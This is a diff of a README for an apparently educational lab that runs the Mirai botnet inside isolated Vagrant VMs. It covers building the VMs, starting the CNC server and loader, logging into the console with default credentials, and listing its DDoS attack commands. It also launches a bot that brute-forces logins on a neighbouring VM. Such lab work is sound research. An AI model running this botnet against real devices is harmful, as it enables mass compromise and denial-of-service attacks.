@@ -45,17 +45,19 @@ Build and Launch VMs
 First of all, clone Github repository and enter the project home directory.
 
 Clone Github Repository
+```
     git clone https://github.com/stanleyshuang/ima2.git
     cd ima2
-
+```
 
 Because the build script needs specific environment variables, select or create a suitable sub-directory in "./_build/" and run the script to have the environment variables.
 
  For example, an isolated network built for develop the environment can be specified as  
 
 Set Environment Variables
+```
     source ./_build/runes-1-qnapxizhi-buffalo/env.sh
-
+```
 
 To look at the environment variables, they include
 
@@ -66,15 +68,17 @@ To look at the environment variables, they include
 To verify the correctness, echo the environment variables to see if set successfully or not
 
 Verify Environment Variables
+```
     echo $ni
     > en6: USB 10/100/1000 LAN
-
+```
 
 Compile all necessary binaries and instantiate the Vagrant VMs.
 
 Build VMs
+```
     ./build.sh
-
+```
 
 To verify the correctness, check VirtualBox. There should be 5 VMs running.
 
@@ -92,24 +96,27 @@ On VM host machine, set the DNS server settings to make "cnc.mirai.com" taking e
 Before set this ping cnc.mirai.com is not working.
 
 Before Set DNS
+```
     ping cnc.mirai.com
     > ping: cannot resolve cnc.mirai.com: Unknown host
-
+```
 
 After set up DNS, ping cnc.mirai.com works well.
 
 Before Set DNS
+```
     ping cnc.mirai.com
     > PING cnc.mirai.com (192.168.11.11): 56 data bytes
     > 64 bytes from 192.168.11.11: icmp_seq=0 ttl=64 time=1.344 ms
     > 64 bytes from 192.168.11.11: icmp_seq=1 ttl=64 time=0.280 ms
     > 64 bytes from 192.168.11.11: icmp_seq=2 ttl=64 time=0.535 ms
-
+```
 
 Run CNC Server and Loader
 Launch CNC Server and loader with the following command.
 
 Run CNC server and loader
+```
     ./run_cnc_and_loader.sh
     > Starting mirai cnc and loader...
     > cd .
@@ -125,7 +132,7 @@ Run CNC server and loader
     > 6s Processed: 1    Conns: 0    Logins: 0   Ran: 0  Echoes:0 Wgets: 0, TFTPs: 0
     > 7s Processed: 1    Conns: 0    Logins: 0   Ran: 0  Echoes:0 Wgets: 0, TFTPs: 0
     > 8s Processed: 1    Conns: 0    Logins: 0   Ran: 0  Echoes:0 Wgets: 0, TFTPs: 0
-
+```
 
 If successfully launched, loaders' status could be observed on the prompt as above.
 
@@ -139,8 +146,9 @@ Username: mirai
 Password: password
 
 Login Mirai CNC Console
+```
     telnet cnc.mirai.com
-
+```
 
 
 
@@ -149,6 +157,7 @@ Login Mirai CNC Console
 After login in successfully, check attack commands. Type "?" to see the available commends.
 
 Check Attack Commands
+```
     mirai>> ?
     Available attack list
     stomp: TCP stomp flood
@@ -163,13 +172,14 @@ Check Attack Commands
     vse: Valve source engine specific flood
      
     mirai>>
-
+```
 
 Simulate a bot to infect a target VM.
 
 Open another bash console. SSH target_0 VM.
 
 SSH Target_0
+```
     cd ima2
     source ./_build/runes-1-qnapxizhi-buffalo/env.sh
     ni="en6: USB 10/100/1000 LAN" ip_prx="192.168.11" cnc_ip="192.168.11.11" tgt_psx="30" vagrant ssh target_0
@@ -185,11 +195,12 @@ SSH Target_0
     You may change this message by editing /etc/motd.
       
     target-0:~$
-    
+```    
 
 Check IP. In this example, it should be 192.168.11.30
 
 Check IP
+```
     target-0:~$ ifconfig
     eth0      Link encap:Ethernet  HWaddr 08:00:27:8B:46:C3
               inet addr:10.0.2.15  Bcast:0.0.0.0  Mask:255.255.255.0
@@ -219,11 +230,12 @@ Check IP
               RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
  
     target-0:~$
-
+```
 
 Launch bot. Be sure running in root permission. The customized bot would connect to CNC server back then try to infect the next IP. In other words, 192.168.11.31, which is target_1 in this example.
 
 Launch Bot
+```
     target-0:~$ sudo -i
     target-0:~# whoami
     root
@@ -269,15 +281,16 @@ Launch Bot
     Resolved report.mirai.com to 1 IPv4 addresses
     [report] Send scan result to loader
     [scanner] FD5 Attempting to brute found IP 192.168.11.31
-
+```
 
 Back to CNC console, a bot, target_0, connecting to CNC could be observed.
 
 Mirai Console Command botcount
+```
     mirai>> botcount
     :   1
     mirai>>
-
+```
 
 Check target_0 prompt, bot is trying to brute-force login other random selected targets.
 
